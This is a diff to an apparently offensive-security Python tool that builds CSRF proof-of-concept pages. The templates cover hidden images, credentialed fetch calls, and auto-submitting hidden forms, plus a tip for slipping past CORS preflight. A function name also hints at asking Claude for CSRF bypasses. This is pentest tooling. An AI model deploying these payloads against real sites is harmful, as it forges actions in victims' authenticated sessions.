@@ -631,6 +631,19 @@ def _js_escape(s):
     )
 
 
+_HTML_OPEN = (
+    "<!DOCTYPE html>\n"
+    '<html lang="en">\n'
+    "<head>\n"
+    '  <meta charset="UTF-8">\n'
+    '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
+    "  <title>CSRF PoC</title>\n"
+    "</head>\n"
+    "<body>\n"
+)
+_HTML_CLOSE = "</body>\n</html>"
+
+
 def generate_csrf_poc(parsed):
     method = parsed["method"]
     url = parsed["url"]
@@ -642,16 +655,12 @@ def generate_csrf_poc(parsed):
     safe_method_js = _js_escape(method)
 
     if method == "GET":
-        html = (
-            "<html>\n"
-            "  <body>\n"
-            f'    <img src="{safe_url_attr}" width="0" height="0" />\n'
-            "    <!-- alternative: force navigation -->\n"
-            f"    <!-- <script>location='{safe_url_js}';</script> -->\n"
-            "  </body>\n"
-            "</html>"
+        inner = (
+            f'  <img src="{safe_url_attr}" width="0" height="0" />\n'
+            "  <!-- alternative: force navigation -->\n"
+            f"  <!-- <script>location='{safe_url_js}';</script> -->\n"
         )
-        return html, "get"
+        return _HTML_OPEN + inner + _HTML_CLOSE, "get"
 
     if "application/json" in ct:
         try:
@@ -659,61 +668,49 @@ def generate_csrf_poc(parsed):
             body_repr = json.dumps(json.loads(body)).replace("</", "<\\/")
         except (json.JSONDecodeError, ValueError):
             body_repr = f"'{_js_escape(body)}'"
-        html = (
-            "<html>\n"
-            "  <body>\n"
-            "    <script>\n"
-            f"      fetch('{safe_url_js}', {{\n"
-            f"        method: '{safe_method_js}',\n"
-            "        credentials: 'include',\n"
-            "        headers: {'Content-Type': 'application/json'},\n"
-            f"        body: JSON.stringify({body_repr})\n"
-            "      });\n"
-            "    </script>\n"
-            "    <!-- Note: Content-Type: application/json triggers CORS preflight.\n"
-            "         Only works if the server has a CORS misconfiguration.\n"
-            "         Try switching Content-Type to text/plain if blocked. -->\n"
-            "  </body>\n"
-            "</html>"
+        inner = (
+            "  <script>\n"
+            f"    fetch('{safe_url_js}', {{\n"
+            f"      method: '{safe_method_js}',\n"
+            "      credentials: 'include',\n"
+            "      headers: {'Content-Type': 'application/json'},\n"
+            f"      body: JSON.stringify({body_repr})\n"
+            "    });\n"
+            "  </script>\n"
+            "  <!-- Note: Content-Type: application/json triggers CORS preflight.\n"
+            "       Only works if the server has a CORS misconfiguration.\n"
+            "       Try switching Content-Type to text/plain if blocked. -->\n"
         )
-        return html, "json"
+        return _HTML_OPEN + inner + _HTML_CLOSE, "json"
 
     if "multipart/form-data" in ct:
-        html = (
-            "<html>\n"
-            "  <body>\n"
-            "    <script>\n"
-            "      var form = new FormData();\n"
-            "      /* Add fields from the captured request body below */\n"
-            "      /* form.append('field', 'value'); */\n"
-            f"      fetch('{safe_url_js}', {{\n"
-            f"        method: '{safe_method_js}',\n"
-            "        credentials: 'include',\n"
-            "        body: form\n"
-            "      });\n"
-            "    </script>\n"
-            "  </body>\n"
-            "</html>"
+        inner = (
+            "  <script>\n"
+            "    var form = new FormData();\n"
+            "    /* Add fields from the captured request body below */\n"
+            "    /* form.append('field', 'value'); */\n"
+            f"    fetch('{safe_url_js}', {{\n"
+            f"      method: '{safe_method_js}',\n"
+            "      credentials: 'include',\n"
+            "      body: form\n"
+            "    });\n"
+            "  </script>\n"
         )
-        return html, "multipart"
+        return _HTML_OPEN + inner + _HTML_CLOSE, "multipart"
 
     # Default: application/x-www-form-urlencoded or unknown — HTML form
     fields = parse_qsl(body, keep_blank_values=True) if body else []
     inputs = "\n".join(
-        f'      <input type="hidden" name="{html_escape(name, quote=True)}" value="{html_escape(value, quote=True)}" />'
+        f'    <input type="hidden" name="{html_escape(name, quote=True)}" value="{html_escape(value, quote=True)}" />'
         for name, value in fields
     )
-    inputs_block = f"\n{inputs}\n    " if inputs else ""
-    html = (
-        "<html>\n"
-        "  <body>\n"
-        f'    <form action="{safe_url_attr}" method="{html_escape(method, quote=True)}" id="csrf-form">'
+    inputs_block = f"\n{inputs}\n  " if inputs else ""
+    inner = (
+        f'  <form action="{safe_url_attr}" method="{html_escape(method, quote=True)}" id="csrf-form">'
         f"{inputs_block}</form>\n"
-        '    <script>document.getElementById(\'csrf-form\').submit();</script>\n'
-        "  </body>\n"
-        "</html>"
+        "  <script>document.getElementById('csrf-form').submit();</script>\n"
     )
-    return html, "form"
+    return _HTML_OPEN + inner + _HTML_CLOSE, "form"
 
 
 def ask_claude_csrf_bypass(parsed, tokens):
